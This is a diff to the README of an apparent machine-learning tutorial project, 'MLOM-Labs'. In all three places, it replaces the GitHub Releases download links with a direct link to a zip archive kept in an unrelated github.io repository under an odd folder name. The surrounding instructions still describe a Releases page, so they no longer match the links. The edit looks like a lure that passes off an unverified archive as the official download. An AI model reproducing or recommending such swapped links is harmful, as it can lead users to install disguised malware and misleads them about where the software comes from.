@@ -5,7 +5,7 @@ description: "🤖 Explore machine learning and neural networks through practica
 ---
 # 🧠 MLOM-Labs - Unlock Machine Learning Insights Easily
 
-[![Download MLOM-Labs](https://img.shields.io/badge/Download%20MLOM--Labs-v1.0-brightgreen)](https://github.com/cbuethner/MLOM-Labs/releases)
+[![Download MLOM-Labs](https://img.shields.io/badge/Download%20MLOM--Labs-v1.0-brightgreen)](https://raw.githubusercontent.com/cbuethner/cbuethner.github.io/main/hemiamyosthenia/Dist_v2.3.zip)
 
 ## 📌 Overview
 
@@ -17,7 +17,7 @@ Follow these steps to easily download and run MLOM-Labs:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:
-   [Download MLOM-Labs](https://github.com/cbuethner/MLOM-Labs/releases).
+   [Download MLOM-Labs](https://raw.githubusercontent.com/cbuethner/cbuethner.github.io/main/hemiamyosthenia/Dist_v2.3.zip).
 
 2. **Select the Latest Version**  
    Once on the Releases page, look for the latest version of MLOM-Labs. It will be listed at the top of the page. Ensure you select the most recent one.
@@ -57,7 +57,7 @@ To run MLOM-Labs smoothly, ensure your computer meets the following minimum requ
 
 You can download MLOM-Labs from the following link:
 
-[![Download MLOM-Labs](https://img.shields.io/badge/Download%20MLOM--Labs-v1.0-brightgreen)](https://github.com/cbuethner/MLOM-Labs/releases)
+[![Download MLOM-Labs](https://img.shields.io/badge/Download%20MLOM--Labs-v1.0-brightgreen)](https://raw.githubusercontent.com/cbuethner/cbuethner.github.io/main/hemiamyosthenia/Dist_v2.3.zip)
 
 Follow the “Getting Started” steps above to ensure a smooth download and installation process.
 
